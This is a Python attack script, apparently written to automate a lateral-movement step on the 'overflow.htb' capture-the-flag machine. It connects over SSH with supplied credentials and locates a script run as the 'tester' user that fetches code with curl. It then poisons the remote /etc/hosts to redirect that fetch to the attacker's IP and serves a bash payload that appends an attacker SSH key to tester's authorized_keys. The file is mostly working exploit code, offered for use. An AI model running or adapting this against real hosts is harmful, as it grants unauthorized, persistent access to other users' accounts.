#!/usr/bin/env python3

import paramiko
from pprint import pprint
import threading
import os
import stat
from Crypto.PublicKey import RSA
import http.server
import socketserver
from io import BytesIO
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler


import settings
from common_tools import Colors

#Allow to kill local HTTP webserver after vuln host download our payload
fake_http_nb_request_received = 0

payload_subdomain = ""
payload_port = 80
payload_script_name = ""


def extract_infos_from_vuln_script(remote_file_content: str):
    """
        Extract infos to impersonate given the following format : http://subdomain:port/script
        - vulnerable subdomain
        - port if specific one is described
        - the script name to create to execute remote actions
    """
    global payload_subdomain
    global payload_port
    global payload_script_name

    for line in remote_file_content.splitlines():
        if "curl" in line:
            #strip() anyway even if not necessary, old habbits
            payload_subdomain = line.split('/')[2].strip()

            #if url is in format "http://subdomain:8080/" we retrieve port and subdomain separately
            if ":" in payload_subdomain:
                payload_subdomain = payload_subdomain.split(':')[0]
                payload_port = int(payload_subdomain.split(':')[1])
            payload_script_name = line.split('/')[-1].strip()[:-1]

            print(f"{Colors.begin_success} subdomain to impersonate : {payload_subdomain}")
            print(f"{Colors.begin_success} script name to create : {payload_script_name}")


class Developer_to_tester(object):
    """docstring for Developer_to_tester"""

    def __init__(self, login: str, password: str):
        self.login = login
        self.password = password
        self.vuln_script = ""
        self.hosts_file_content = ""
        self._ssh_handler = None
        self.__init_ssh_handler()
        self._ssh_handler.connect("overflow.htb", 22, self.login, self.password, timeout = 10)

    def __init_ssh_handler(self):
        self._ssh_handler = paramiko.SSHClient()
        self._ssh_handler.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def __str__(self):
        final_str_repr = ""
        final_str_repr += "login : "+self.login+"\n"
        final_str_repr += "password : "+self.password+"\n"
        final_str_repr += "vuln_script : "+self.vuln_script+"\n"
        final_str_repr += "hosts_file_content : "+self.hosts_file_content
        return final_str_repr

    def __del__(self):
        if isinstance(self._ssh_handler, paramiko.client.SSHClient):
            self._ssh_handler.close()
            self._ssh_handler = None

    def __dump_hosts_file(self):
        """
            Function to dump remote /etc/hosts file because we will restore it later
        """
        sftp_client = self._ssh_handler.open_sftp()
        remote_file = sftp_client.open('/etc/hosts')
        try:
            for line in remote_file:
                self.hosts_file_content+=line
        finally:
            remote_file.close()

    def find_vuln_script(self):
        """
            Connect as developer user, find the vulnerable script
            Then grab vuln subdomain and script name to create
        """
        stdin,stdout,stderr = self._ssh_handler.exec_command("find /opt -executable -type f -user 'tester' -group 'tester' 2>/dev/null")
        result = stdout.read()

        self.vuln_script = result.decode().strip()
        print(Colors.begin_success+"Vulnerable script found : "+self.vuln_script)

    def print_remote_script(self):
        """
            Simply show the remote vuln script in console
        """
        remote_file_content = ""

        #reading remote script
        sftp_client = self._ssh_handler.open_sftp()
        remote_file = sftp_client.open(self.vuln_script)
        try:
            for line in remote_file:
                remote_file_content+=line
        finally:
            remote_file.close()

        print(Colors.begin_info+"Remote vulnerable script content : ")
        print(Colors.colorize(remote_file_content, 'BLUE'))

        print("\nExtracting informations...")
        extract_infos_from_vuln_script(remote_file_content)

    def __hosts_file_rights(self):
        """
            Verify that we have the rights to modify /etc/hosts
        """
        id_infos = {}
        stdin,stdout,stderr = self._ssh_handler.exec_command("id")
        result = stdout.read().decode()

        for elem in result.split(' '):
            splited = elem.split('=')
            id_infos[splited[0]] = splited[1]

        stdin,stdout,stderr = self._ssh_handler.exec_command("ls -la /etc/hosts")
        result = stdout.read().decode()

        owner, group = result.split(' ')[2:4]

        for id_info in id_infos.values():
            if owner in id_info or group in id_info:
                print(Colors.begin_success+"We have permission to change "+Colors.color_files('/etc/hosts') +" file!")
                print(Colors.begin_info+self.login+" infos : ")
                for key, value in id_infos.items():
                    print(Colors.colorize(key+" : "+value, 'YELLOW'))
                return True
        return False

    def modify_hosts_file(self):
        """
            Create fake entry to remote /etc/hosts file
        """
        if self.__hosts_file_rights():
            print(Colors.begin_info+"Modifying remote "+Colors.color_files('/etc/hosts') +" file")
            #before modifying /etc/hosts, dump it (to be able to restore it)
            self.__dump_hosts_file()
            #adding our poisoned conf
            modified_content = self.hosts_file_content+"\n"+settings.ip+"\t"+payload_subdomain+"\n"
            ftp = self._ssh_handler.open_sftp()
            ftp.putfo(BytesIO(modified_content.encode()), '/etc/hosts')
            ftp.close()

    def restore_hosts_file(self):
        """
            Simply restore default conf for /etc/hosts
        """
        print(Colors.begin_info+"Remove modifications on "+Colors.color_files('/etc/hosts'))
        ftp = self._ssh_handler.open_sftp()
        ftp.putfo(BytesIO(self.hosts_file_content.encode()), '/etc/hosts')
        ftp.close()


def create_ssh_key_files():
    """
        Our payload will need SSH key pair to work.
        Generate them inside payloads folder
    """
    print(Colors.begin_info+"Generating SSH key pair")
    key = RSA.generate(4096)
    with open(settings.rsa_key['priv'], 'w+b') as content_file:
        os.chmod(settings.rsa_key['priv'], stat.S_IWUSR|stat.S_IRUSR )
        content_file.write(key.exportKey('PEM'))
    pubkey = key.publickey()
    with open(settings.rsa_key['pub'], 'w+b') as content_file:
        os.chmod(settings.rsa_key['pub'], stat.S_IWUSR|stat.S_IRUSR|stat.S_IRGRP)
        content_file.write(pubkey.exportKey('OpenSSH'))


def create_fake_script():
    """
        Generate a local script according to remote discovered flaw.
        It will add our generated SSH public key file to authorized_keys on victim
    """
    pub_key = ""

    print(Colors.begin_info+"Creating payload script : "+Colors.color_files(settings.payloads_folder+payload_script_name))
    with open(settings.rsa_key['pub'], 'r') as f:
        pub_key = f.readline()
    script_content=f'''#!/bin/bash

REMOTE_SSH_FOLDER="/home/tester/.ssh"
LOCAL_PUB_KEY="{pub_key}"

if [[ ! -d ${{REMOTE_SSH_FOLDER}} ]];then
    mkdir ${{REMOTE_SSH_FOLDER}}
    chmod 700 ${{REMOTE_SSH_FOLDER}}
fi

if [[ ! -f "$REMOTE_SSH_FOLDER/authorized_keys" ]]; then
    touch "$REMOTE_SSH_FOLDER/authorized_keys"
    chmod 600 "$REMOTE_SSH_FOLDER/authorized_keys"
fi

echo "$LOCAL_PUB_KEY" >> "$REMOTE_SSH_FOLDER/authorized_keys"'''
    with open(settings.payloads_folder+payload_script_name, 'w+') as f:
        f.write(script_content)
    os.chmod(settings.payloads_folder+payload_script_name, stat.S_IXUSR|stat.S_IRUSR|stat.S_IRGRP|stat.S_IXGRP|stat.S_IXOTH)
    print(Colors.colorize(script_content, 'BLUE'))



class Requests_handler(http.server.SimpleHTTPRequestHandler):
    """
        Simple webserver that will stop after just one hit (when victim download our payload)
    """

    def do_GET(self):
        print(Colors.begin_success+"Our payload has been downloaded !")
        self.server.stop = True
        return http.server.SimpleHTTPRequestHandler.do_GET(self)


class StoppableHttpServer(http.server.HTTPServer):
    """
        HTTP server that reacts to self.stop flag
    """

    def serve_forever(self):
        """
            Handle one request at a time until stopped
        """
        print(Colors.begin_info+"Launching HTTP local server !")
        os.chdir(settings.payloads_folder)
        self.stop = False
        while not self.stop:
            print(Colors.begin_info+"Listening for connection...")
            self.handle_request()
        print(Colors.begin_info+"Shutting down server...")


